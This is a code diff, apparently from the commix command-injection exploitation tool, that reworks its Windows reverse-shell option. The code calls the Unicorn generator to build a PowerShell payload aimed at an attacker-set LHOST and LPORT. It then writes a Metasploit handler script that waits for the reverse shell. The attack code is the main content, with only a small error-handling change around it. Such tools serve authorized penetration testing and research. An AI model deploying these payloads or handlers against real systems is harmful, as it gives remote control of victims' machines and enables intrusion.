@@ -389,7 +389,6 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
     
     # Powershell injection attacks
     elif other_shell == '7':
-
       if not settings.TARGET_OS == "win":
         windows_only_attack_vector()
         continue
@@ -452,32 +451,41 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
           elif windows_reverse_shell == '2':
             try:
               current_path = os.getcwd()
-              unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
-              os.chdir(unicorn_path)
-              # Check for Unicorn version.
-              with open('unicorn.py') as unicorn_file:
-                for line in unicorn_file:
-                  line = line.rstrip()
-                  if "Magic Unicorn Attack Vector v" in line:
-                    unicorn_version = line.replace("Magic Unicorn Attack Vector v", "").replace(" ", "").replace("-","").replace("\"","").replace(")","")
-                    break 
+              try:
+                unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
+                os.chdir(unicorn_path)
+                # Check for Unicorn version.
+                with open('unicorn.py') as unicorn_file:
+                  for line in unicorn_file:
+                    line = line.rstrip()
+                    if "Magic Unicorn Attack Vector v" in line:
+                      unicorn_version = line.replace("Magic Unicorn Attack Vector v", "").replace(" ", "").replace("-","").replace("\"","").replace(")","")
+                      break 
+              except:
+                unicorn_version = "" 
               update.check_unicorn_version(unicorn_version)
-              gen_payload_msg(payload)
-              subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
-              with open(output, 'r') as content_file:
-                other_shell = content_file.read().replace('\n', '')
-              print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
-              # Remove the ouput file
-              os.remove(output)
-              with open("unicorn.rc", 'w+') as filewrite:
-                filewrite.write("use exploit/multi/handler\n"
-                                "set payload " + payload + "\n"
-                                "set lhost " + str(settings.LHOST) + "\n"
-                                "set lport " + str(settings.LPORT) + "\n"
-                                "exploit\n\n")
-              msf_launch_msg("unicorn.rc")
-              # Return to the current path.
-              os.chdir(current_path)
+              try:
+                if len(unicorn_version) == 0:
+                  unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
+                  os.chdir(unicorn_path)
+                gen_payload_msg(payload)
+                subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
+                with open(output, 'r') as content_file:
+                  other_shell = content_file.read().replace('\n', '')
+                print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+                # Remove the ouput file
+                os.remove(output)
+                with open("unicorn.rc", 'w+') as filewrite:
+                  filewrite.write("use exploit/multi/handler\n"
+                                  "set payload " + payload + "\n"
+                                  "set lhost " + str(settings.LHOST) + "\n"
+                                  "set lport " + str(settings.LPORT) + "\n"
+                                  "exploit\n\n")
+                msf_launch_msg("unicorn.rc")
+                # Return to the current path.
+                os.chdir(current_path)
+              except:
+                continue 
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
